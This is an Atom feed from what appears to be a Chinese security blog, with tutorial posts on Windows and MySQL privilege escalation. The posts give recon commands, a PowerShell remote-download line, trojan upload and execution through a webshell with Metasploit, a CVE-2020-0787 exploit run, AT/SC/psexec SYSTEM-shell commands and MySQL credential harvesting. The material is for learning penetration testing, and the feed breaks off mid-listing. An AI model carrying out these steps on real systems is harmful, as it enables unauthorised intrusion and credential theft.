<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>HVVL404</title>
  
  
  <link href="http://blog.hvvl404.fun/atom.xml" rel="self"/>
  
  <link href="http://blog.hvvl404.fun/"/>
  <updated>2023-06-06T15:37:11.880Z</updated>
  <id>http://blog.hvvl404.fun/</id>
  
  <author>
    <name>HVVL404</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>59：权限提升-Win溢出漏洞及AT&amp;SC&amp;PS提权</title>
    <link href="http://blog.hvvl404.fun/2023/06/05/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/59%EF%BC%9A%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%8F%8AAT&amp;SC&amp;PS%E6%8F%90%E6%9D%83/"/>
    <id>http://blog.hvvl404.fun/2023/06/05/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/59%EF%BC%9A%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%8F%8AAT&amp;SC&amp;PS%E6%8F%90%E6%9D%83/</id>
    <published>2023-06-05T14:47:18.052Z</published>
    <updated>2023-06-06T15:37:11.880Z</updated>
    
    <content type="html"><![CDATA[<p>59：权限提升-Win溢出漏洞及AT&amp;SC&amp;PS提权</p><span id="more"></span><p>思维导图</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/59-1.png" alt="59-1"></p><p>明确权限提升基础知识：权限划分</p><p>明确权限提升环境问题：web及本地</p><ul><li>web提权：已有网站权限（可以操作网站内容，但无法操作服务器），想要获得服务器权限，进而操作服务器。</li><li>本地提权：已有服务器普通用户权限，想要获得root权限。</li></ul><p>明确权限提升方法针对：针对方法适应问题</p><p>明确权限提升针对版本：个人及服务器版本;针对方法；</p><p>知识点必备：</p><ul><li>用户及用户组权限划分；Windows提权命令</li></ul><p><strong>windows权限认识(用户及用户组)</strong></p><p>Windows系统内置了许多本地用户组，这些用户组本身都已经被赋予一些权限（permissions),它们具有管理本地计算机或访问本地资源的权限。只要用户账户加入到这些本地组内，这些用户账户也将具备该组所拥有的权限。</p><p><strong>0x01 普通权限</strong></p><p>默认情况下，系统为用户分了7个组，并给每个组赋予不同的操作权限，管理员组(Administrators)、高权限用户组(Power Users)、普通用户组(Users)、备份操作组(Backup  Operators)、文件复制组(Replicator)、来宾用户组(Guests)，身份验证用户组(Ahthenticated users)。其中备份操作组和文件复制组为维护系统而设置，平时不会被使用。</p><p>管理员组拥有大部分的计算机操作权限(并不是全部)，能够随意修改删除所有文件和修改系统设置只有程序信任组（特殊权限）。再往下就是高权限用户组，这一部分用户也能做大部分事情，但是不能修改系统设置，不能运行一些涉及系统管理的程序。普通用户组则被系统拴在了自己的地盘里，不能处理其他用户的文件和运行涉及管理的程序等。来宾用户组的文件操作权限和普通用户组一样，但是无法执行更多的程序。身份验证用户组(Ahthenticated users) 经过ms验证程序登录的用户均属于此组。　　</p><p><strong>0x02特殊权限</strong></p><p>　　除了上面提到的7个默认权限分组，系统还存在一些特殊权限成员，这些成员是为了特殊用途而设置，分别是:SYSTEM(系统)、Trustedinstaller（信任程序模块）、Everyone(所有人)、CREATOR OWNER(创建者) 等，这些特殊成员不被任何内置用户组吸纳，属于完全独立出来的账户。<br>　　真正拥有“完全访问权”的只有一个成员:SYSTEM。这个成员是系统产生的，真正拥有整台计算机管理权限的账户，一般的操作是无法获取与它等价的权限的。<br>　　“所有人”权限与普通用户组权限差不多，它的存在是为了让用户能访问被标记为“公有”的文件，这也是一些程序正常运行需要的访问权限——任何人都能正常访问被赋予“Everyone”权限的文件，包括来宾组成员。<br>　　被标记为“创建者”权限的文件只有建立文件的那个用户才能访问，做到了一定程度的隐私保护。<br>　　但是，所有的文件访问权限均可以被管理员组用户和SYSTEM成员忽略，除非用户使用了NTFS加密。<br>　　无论是普通权限还是特殊权限，它们都可以“叠加”使用，“叠加”就是指多个权限共同使用，例如一个账户原本属于Users组，而后我们把他加入Administrators组再加入Trustedinstaller等权限提升，那么现在这个账户便同时拥有两个或多个权限身份，而不是用管理员权限去覆盖原来身份。权限叠加并不是没有意义的，在一些需要特定身份访问的场合，用户只有为自己设置了指定的身份才能访问，这个时候“叠加”的使用就能减轻一部分劳动量了。</p><p>参考：<a href="https://blog.csdn.net/qq_17204441/article/details/89063095">https://blog.csdn.net/qq_17204441/article/details/89063095</a></p><p><strong>Windows提权命令：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">命令                          //描述</span><br><span class="line">systeminfo  　　　　　　　　//打印系统信息</span><br><span class="line">whoami      　　　　　　　　//获得当前用户名</span><br><span class="line">whoami /priv    　　　　　　//当前账户权限</span><br><span class="line">ipconfig        　　　　　  //网络配置信息</span><br><span class="line">ipconfig /displaydns        //显示DNS缓存</span><br><span class="line">route print                 //打印出路由表</span><br><span class="line">arp -a                      //打印arp表</span><br><span class="line">hostname                    //主机名</span><br><span class="line">net user                    //列出用户</span><br><span class="line">net user UserName           //关于用户的信息</span><br><span class="line">net user \SMBPATH Pa$$w0rd /u:UserName      //连接SMB</span><br><span class="line">net localgroup              //列出所有组</span><br><span class="line">net localgroup GROUP        //关于指定组的信息</span><br><span class="line">net view \127.0.0.1         //会话打开到当前计算机</span><br><span class="line">net session                 //开发给其他机器</span><br><span class="line">netsh firewall show config  //显示防火墙配置</span><br><span class="line">DRIVERQUERY             　　//列出安装的驱动</span><br><span class="line">tasklist /svc               //列出服务任务</span><br><span class="line">net start                   //列出启动的服务</span><br><span class="line">dir /s foo                  //在目录中搜索包含指定字符的项</span><br><span class="line">dir /s foo == bar           //同上</span><br><span class="line">sc query                    //列出所有服务</span><br><span class="line">sc qc ServiceName           //找到指定服务的路径</span><br><span class="line">shutdown /r /t 0            //立即重启</span><br><span class="line">type file.txt               //打印出内容</span><br><span class="line">icacls &quot;C:\Example&quot;         //列出权限</span><br><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn  //列出已安装的补丁</span><br><span class="line">(New-Object System.Net.WebClient) .DownloadFile(&quot;http://host/file&quot;.&quot;C:\LocalPath&quot;)　//利用ps远程下载文件到本地</span><br><span class="line">accesschk.exe -qwsu &quot;Group&quot;         //修改对象（尝试Everyone，Authenticated Users和/或Users）</span><br></pre></td></tr></table></figure><p><strong>案例1：基于Web环境下的权限提升-阿里云靶机（Windows2012）</strong></p><p>知识点：</p><ul><li>如何判断使用哪种溢出漏洞？漏洞哪里找？</li><li>信息收集-补丁筛选-利用MSF或特定EXP-执行-西瓜到手</li><li>Vulmap，Wes，WindowsVulnScan对比，exp在哪里获取？</li><li>MSF结合云服务器搭建组合拳？模拟上述操作实战演练？</li></ul><p><strong>1、信息收集</strong></p><p>可以采用一些cmd命令，收集系统信息。比如</p><ul><li>whoami：获得当前用户名</li><li>whoami &#x2F;priv：当前账户权限</li><li>systeminfo：查看系统打了哪些补丁</li><li>net user：列出用户</li><li>net user UserName：查看关于用户的信息</li><li>net localgroup：列出所有组</li><li>等等</li></ul><p><strong>2、补丁筛选</strong></p><p>Vulmap，Wes，WindowsVulnScan三种方法对比：</p><p>方法1：Vulmap</p><p>下载地址：<a href="https://github.com/vulmon/Vulmap">https://github.com/vulmon/Vulmap</a></p><p>Vulmap是开源的在线本地漏洞扫描器项目。Vulmap需要在PS窗口运行，因此它只适用本地环境，不适用web环境。适用于 Windows 和 Linux 操作系统漏洞。但是它对Windows系统不太友好，更适配Linux系统。比如，下面在阿里云服务器测试，未检测出漏洞。</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/59-2.png" alt="59-2"></p><p>方法2：WES-NG</p><p>下载地址：<a href="https://github.com/bitsadmin/wesng">https://github.com/bitsadmin/wesng</a></p><p>WES-NG是一种基于 Windows systeminfo 实用程序输出的工具，它提供操作系统易受攻击的漏洞列表，包括对这些漏洞的任何利用。适用于 Windows 操作系统。</p><p>wes.py 既适用本地环境，也适用web环境。因为它只需要我们在目标服务器执行systeminfo &gt; 1.txt命令，拿到系统信息（主要是补丁信息）即可，然后我们可以把信息保存在 1.txt文件中，在本机运行wes.py进行测试即可。</p><p>下面命令会把漏洞详情保存在vuln.csv文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">目标服务器执行命令：systeminfo &gt; 1.txt</span><br><span class="line">本机执行命令：python wes.py 1.txt -o vuln.csv</span><br></pre></td></tr></table></figure><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/59-3.png" alt="59-3"></p><p>打开 vuln.csv查看详情</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/59-4.png" alt="59-4"></p><p>方法3：WindowsVulnScan</p><p>地址：<a href="https://github.com/chroblert/WindowsVulnScan">https://github.com/chroblert/WindowsVulnScan</a></p><p>WindowsVulnScan根据软件的名称和版本号来确定是否有 CVE 和公开的 EXP。适用于 Windows 操作系统。</p><p>WindowsVulnScan 前期收集补丁信息时也需要在PS窗口运行，因此只适用于本地环境。但是我们也可以对其进行一些小的修改，让它可以用于web环境。所以也可以说它是一个通用方法。</p><p>比如第一步运行KBCollect.ps1收集补丁信息，会自动创建KB.json文件。</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/59-5.png" alt="59-5"></p><p>打开KB.json文件，我们看到其实这就是一些补丁信息，我们可以直接用systeminfo命令代替，然后将收集到的信息按照KB.json格式重新排列一下即可。</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/59-6.png" alt="59-6"></p><p>然后运行如下命令得到exp信息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python cve-check.py -C -f KB.json</span><br></pre></td></tr></table></figure><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/59-7.png" alt="59-7"></p><p><strong>3、利用MSF或特定EXP提权</strong></p><p>利用上述3种方法之一找出可利用的漏洞之后，我们可以利用msf或者特定exp进行测试。</p><p>首选msf工具，但是msf工具是隔一段时间更新一版，因此msf中的漏洞可能更新不及时，如果遇到了msf没有收录的漏洞，我们可以网上搜索特定的exp测试，比如GitHub上有人整理了很多exp，可以搜索一下。</p><ul><li><a href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a></li><li><a href="https://github.com/unamer/CVE-2018-8120">https://github.com/unamer/CVE-2018-8120</a></li></ul><p><strong>MSF结合云服务器搭建组合拳？模拟上述操作实战演练？</strong></p><ul><li>若要在实战中使用msf，最好买台服务器，不需要配置太好，2核4G即可，linux操作系统（Ubuntu更兼容），只安装msf，使用时用xshell连接即可。</li><li>云服务器上安装MSF环境：<a href="https://www.cnblogs.com/M0rta1s/p/11920903.html">https://www.cnblogs.com/M0rta1s/p/11920903.html</a></li></ul><p>msf提权演示案例：</p><p> &lt;1&gt;生成一个木马 exe文件</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/59-8.png" alt="59-8"></p><p>&lt;2&gt;通过webshell上传这个test.exe文件到服务器（test.exe可能会被服务器上的waf识别，所以实战中需要免杀）</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/59-9.png" alt="59-9"></p><p>&lt;3&gt;启动msf</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/59-10.png" alt="59-10"></p><p>&lt;4&gt;msf监听5566端口</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/59-11.png" alt="59-11"></p><p>&lt;5&gt;通过webshell执行这个test.exe文件</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/59-12.png" alt="59-12"></p><p>&lt;6&gt;监听到会话，如上上图所示（注意：阿里云服务器安全组默认没有开5566端口，所以我们需要手动打开）</p><p>&lt;7&gt;查看，拿到服务器的web权限</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/59-13.png" alt="59-13"></p><p>&lt;8&gt;接下来，我们需要进行web提权，搜索一个2016年的exp</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/59-14.png" alt="59-14"></p><p>&lt;9&gt;使用这个exp</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/59-15.png" alt="59-15"></p><p>&lt;10&gt;show options</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/59-16.png" alt="59-16"></p><p>&lt;11&gt;修改设置</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/59-17.png" alt="59-17"></p><p>&lt;12&gt;重新show options，显示修改成功</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/59-18.png" alt="59-18"></p><p>&lt;13&gt;继续修改设置，利用，成功获取到system权限，提权成功。</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/59-19.png" alt="59-19"></p><p><strong>案例2：基于本地环境下的权限提升-系统溢出漏洞</strong></p><p>使用特定EXP演示案例：</p><p>&lt;1&gt;whoami查看用户身份为普通用户</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/59-20.png" alt="59-20"></p><p>&lt;2&gt;利用CVE-2020-0787本地提权漏洞，在目标服务器执行BitsArbitraryFileMoveExploit.exe文件</p><ul><li><a href="https://github.com/cbwang505/CVE-2020-0787-EXP-ALL-WINDOWS-VERSION/releases/tag/1">https://github.com/cbwang505/CVE-2020-0787-EXP-ALL-WINDOWS-VERSION/releases/tag/1</a></li></ul><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/59-21.png" alt="59-21"></p><p>&lt;3&gt;弹出cmd窗口，运行whoami，发现已经取得了system权限</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/59-22.png" alt="59-22"></p><p><strong>案例3：基于本地环境下的权限提升-AT&amp;SC&amp;PS命令</strong></p><p>AT&amp;SC&amp;PS命令适用环境？–&gt;AT&amp;SC&amp;PS提权在内网使用比较多</p><p>1、AT提权</p><p>相关命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">at 21:26 /interactive cmd.exe //给系统添加一项作业，在21:26打开cmd命令</span><br><span class="line">at  //查看作业详情</span><br><span class="line">at /del //删除作业</span><br></pre></td></tr></table></figure><p>只针对win7之前的老系统，下面我们在windows2003系统上测试</p><p>&lt;1&gt;使用at命令给系统添加一项作业，在特定时间打开cmd命令</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/59-23.png" alt="59-23"></p><p>&lt;2&gt;等到特定时间时，系统会弹出cmd窗口，运行whoami，发现已经取得了system权限，提权成功。</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/59-24.png" alt="59-24"></p><p>这是windows2003系统设计上的一个逻辑错误，就是计划任务在运行时会以system身份调用执行。所以弹出来的cmd窗口界面就会享有system权限。</p><p>2、SC提权</p><p>相关命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc Create syscmd binPath = &quot;cmd /k start&quot; type= own type= interact</span><br><span class="line">sc start syscmd</span><br></pre></td></tr></table></figure><p>网上说，可以针对win7&#x2F;2k8，但是实操时并没成功。下面我们在windows2003系统上测试</p><p>&lt;1&gt;首先whoami查看用户身份为管理员</p><p>&lt;2&gt;使用sc命令创建一个服务，启动这个服务</p><p>&lt;3&gt;弹出cmd窗口，运行whoami，发现已经取得了system权限，提权成功。</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/59-25.png" alt="59-25"></p><p>3、PS提权</p><p>pstools是微软官方工具，是为windows提供的第三方工具库</p><p>下载地址：<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools">https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools</a></p><p>相关命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec.exe -accepteula -s -i -d cmd.exe</span><br></pre></td></tr></table></figure><p>windows2008系统测试</p><p>&lt;1&gt;执行PS命令会弹出一个新的cmd窗口</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/59-26.png" alt="59-26"></p><p>&lt;2&gt;运行whoami，发现已经取得了system权限，提权成功。</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/59-27.png" alt="59-27"></p><p>案例给到的思路总结如下：</p><p>1.提权方法有部分适用在不同环境，当然也有通用方法<br>2.提权方法也有操作系统版本区别，特性决定方法利用面<br>3.提权方法有部分需要特定环境，如数据库，第三方提权等</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;59：权限提升-Win溢出漏洞及AT&amp;amp;SC&amp;amp;PS提权&lt;/p&gt;</summary>
    
    
    
    <category term="小迪安全" scheme="http://blog.hvvl404.fun/categories/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>60：权限提升-MY&amp;MS&amp;ORA等SQL数据库提权</title>
    <link href="http://blog.hvvl404.fun/2023/06/05/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60%EF%BC%9A%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-MY&amp;MS&amp;ORA%E7%AD%89SQL%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/"/>
    <id>http://blog.hvvl404.fun/2023/06/05/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60%EF%BC%9A%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-MY&amp;MS&amp;ORA%E7%AD%89SQL%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/</id>
    <published>2023-06-05T14:37:01.209Z</published>
    <updated>2023-06-06T15:37:17.475Z</updated>
    
    <content type="html"><![CDATA[<p>60：权限提升-MY&amp;MS&amp;ORA等SQL数据库提权</p><span id="more"></span><p>思维导图</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-1.png" alt="60-1"></p><p>在利用系统溢出漏洞无果的情况下，可以采用数据库进行提权，但需要知道数据库提权的前提条件：服务器开启数据库服务以及获取到最高权限用户密码。除Access数据库外，其他数据库基本上都存在数据库提权的可能。</p><p>本课重点：</p><ul><li>数据库应用提权在权限提升中的意义</li><li>WEB或本地环境如何探针数据库应用</li><li>数据库提权权限用户密码收集等方法</li><li>目前数据库提权对应的技术及方法等</li></ul><p><strong>案例1：MySQL数据库提权演示-脚本&amp;MSF</strong></p><p>环境准备：阿里云服务器，windows2012操作系统，php+mysql环境搭建，已上传后门并取得webshell权限</p><p>流程：服务探针-信息收集-提权利用-获取权限</p><p>1、服务探针</p><p>连接webshell，对目标服务器进行端口扫描，发现开放了3306端口，说明服务器部署了MySQL数据库。</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-2.png" alt="60-2"></p><p>2、信息收集</p><p>MySQL的最高权限的用户名为root，尝试获取root的密码。</p><p>方法1：读取网站数据库配置文件</p><p>这种方法的关键是了解其命名规则及查找技巧。可以重点查看带有关键字的配置文件，常见的关键字有sql、data、inc、config、conn、database、common、include等。</p><p>举例1：database.php</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-3.png" alt="60-3"></p><p>举例2：config.inc.php</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-4.png" alt="60-4"></p><p>当然在实战中，即使你找到了配置文件，系统也不一定用的是root用户。</p><p>方法2：读取数据库存储或备份文件</p><p>首先，我们了解一下MySQL数据库存储格式及对应内容。</p><p>@@basedir&#x2F;data&#x2F;数据库名&#x2F;表名.myd，表名.myd文件中的内容对应的就是表的内容</p><p>举例1</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-5.png" alt="60-5"></p><p>举例2</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-6.png" alt="60-6"></p><p>查询用户名密码时，我们用到了如下SQL语句。</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-7.png" alt="60-7"></p><p>相应地，mysql.user对应的内容就存储在MySQLr&#x2F;data&#x2F;mysql&#x2F;user.myd文件中</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-8.png" alt="60-8"></p><p>打开user.myd文件，找到root用户名密码。</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-9.png" alt="60-9"></p><p>该密码使用MD5散列加密，网上存在丰富的彩虹表破解。</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-10.png" alt="60-10"></p><p>方法3：利用脚本暴力猜解</p><p>获取数据库最高权限密码，一般我们使用前两种方法居多，如果前两种方法实在用不了，我们才考虑使用暴力猜解。暴力猜解之前，需要先了解数据库是否支持外联以及如何开启外联。</p><ul><li>若数据库支持外联，可以远程本地暴力猜解；</li><li>若数据库不支持外联，可以服务器本地暴力猜解。</li></ul><p>但是，其实root账户一般是不支持外联的，所以没法使用工具进行本地暴力猜解，但是我们可以将脚本通过webshell上传到服务器，在服务器本地使用脚本暴力猜解。脚本可以从网上自行下载。</p><p>演示</p><p>&lt;1&gt;数据库支持外联，使用msf工具远程本地暴力猜解。相关命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 